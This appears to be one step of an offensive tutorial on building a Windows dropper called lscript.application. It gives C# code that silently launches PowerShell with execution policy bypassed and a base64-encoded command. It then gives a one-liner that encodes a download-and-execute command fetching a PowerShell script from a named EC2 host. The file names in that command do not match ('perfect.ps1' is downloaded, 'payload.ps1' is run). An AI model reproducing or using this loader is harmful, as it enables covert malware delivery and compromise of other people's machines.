## 1. Create lscript.application

1. Go to Visual Studio Community edition
2. Create a C# Console application for Windows
3. In lscript.cs, write the following code ->

```
using System.Diagnostics;

static class Program {
    [System.STAThread]
    static void Main() {
        string encoded = "<YOUR_BASE64_STRING>";
        string psArgs = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded}";
        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", psArgs) {
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(psi);
    }
}
```

4. Change the Uri to the EC2 instance with the **perfect.ps1** script. Run the below command in Mac/Linux,

```
echo "Invoke-WebRequest -Uri 'http://ec2-3-253-172-6.eu-west-1.compute.amazonaws.com:80/perfect.ps1' -OutFile 'perfect.ps1'; powershell -ExecutionPolicy Bypass -File 'payload.ps1'" | iconv -t UTF-16LE | base64 -w 0
```
